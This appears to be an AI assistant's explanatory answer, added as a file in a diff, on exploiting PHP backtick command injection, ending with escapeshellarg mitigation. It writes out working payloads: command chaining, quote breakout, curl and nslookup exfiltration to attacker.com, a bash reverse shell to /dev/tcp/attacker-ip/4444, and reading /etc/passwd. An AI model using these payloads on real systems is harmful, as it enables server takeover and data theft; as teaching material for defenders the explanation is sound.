@@ -1,0 +1,70 @@
+In PHP, using backticks (`...`) is an alias for the shell_exec() function. It executes whatever is inside the backticks directly on the server's operating system terminal (Linux or Windows). [1] 
+If untrusted user input is placed inside those backticks without strict sanitization, it creates a severe Command Injection vulnerability. [2] 
+Here are all the ways an attacker can exploit backticks based on how the developer structured the code:
+------------------------------
+## 1. Direct Chaining (The Easiest Exploit)
+If the input is appended directly to the end of a command, an attacker can use shell control operators to terminate the original command and start their own. [3, 4] 
+
+* Vulnerable Code:
+
+$input = $_GET['host'];
+$output = `ping -c 1 ` . $input;
+
+* Exploitation: The attacker sends 8.8.8.8; id or 8.8.8.8 && whoami.
+* What the server executes:
+
+ping -c 1 8.8.8.8; id
+
+The server pings the IP, stops, and immediately runs the id command, returning the web server's user privileges. [5, 6, 7, 8, 9] 
+
+## 2. Argument Injection (When Input is Inside Quotes)
+Even if a developer tries to be clever by wrapping the user input in single or double quotes inside the backticks, an attacker can break out of those quotes using shell operators.
+
+* Vulnerable Code:
+
+$input = $_GET['filename'];
+$output = `ls -la "$input"`;
+
+* Exploitation: The attacker sends "; whoami; #.
+* What the server executes:
+
+ls -la ""; whoami; #"
+
+The first quote closes the ls string, the semicolon separates the command, whoami executes, and the # comments out the final trailing quote so the terminal doesn't throw a syntax error. [10, 11, 12, 13, 14] 
+
+## 3. Blind / Out-of-Band (OOB) Exploitation
+Sometimes, backticks execute a command, but the PHP script does not display the output on the webpage (e.g., echo $output is missing). This is called a Blind Command Injection. Attackers exploit this using alternative exfiltration channels: [15, 16, 17] 
+
+* Time-Based Delays: The attacker forces the server to pause. If they send ; sleep 10 and the webpage takes exactly 10 seconds longer to load, they know the RCE worked. [18, 19] 
+* DNS Log Exfiltration: The attacker forces the server to look up a URL they control. They send ; curl http://attacker.com or ; nslookup $(whoami).attacker.com. The attacker checks their own server logs to see the username sent by the victim server. [20, 21, 22, 23] 
+
+## 4. Spawning a Reverse Shell (Full Server Takeover)
+Once an attacker confirms backticks are executing commands, their ultimate goal is usually to get a live, interactive terminal connection back to their own machine. [24] 
+
+* Exploitation: The attacker sets up a listener on their machine (nc -lvnp 4444) and sends a payload like this via the URL:
+
+; bash -i >& /dev/tcp/attacker-ip/4444 0>&1
+
+* What happens: The server opens a silent background connection directly to the attacker, giving them total terminal control over the website's hosting environment. [25, 26, 27, 28] 
+
+------------------------------
+## Common Shell Control Operators Used to Exploit Backticks
+Depending on the operating system (Linux vs. Windows), attackers will try different operators to break the backtick command logic: [29, 30, 31] 
+
+| Operator | Platform | Behavior | Example Payload |
+|---|---|---|---|
+| ; | Linux | Runs commands sequentially | ; id |
+| && | Both | Runs second command only if first succeeds | && whoami |
+| | | Both | Pipes output of first to input of second | | cat /etc/passwd |
+| || | Both | Runs second command only if first fails | || uname -a |
+| ` or $() | Linux | Inline command execution (Nested evaluation) | $(whoami) or `id` |
+| & | Windows | Runs commands sequentially (similar to ;) | & dir |
+
+## How to Block This Completely
+
+   1. Never use backticks for variable data.
+   2. If you absolutely must run a system command, pass input through escapeshellarg() or escapeshellcmd() first. This escapes spaces, quotes, and control operators so the terminal treats the entire input as a single safe text string. [32, 33, 34, 35, 36] 
+
+Are you testing a specific PHP script for a security audit, or are you building a safe terminal wrapper and want to make sure your filtering works?
+
+
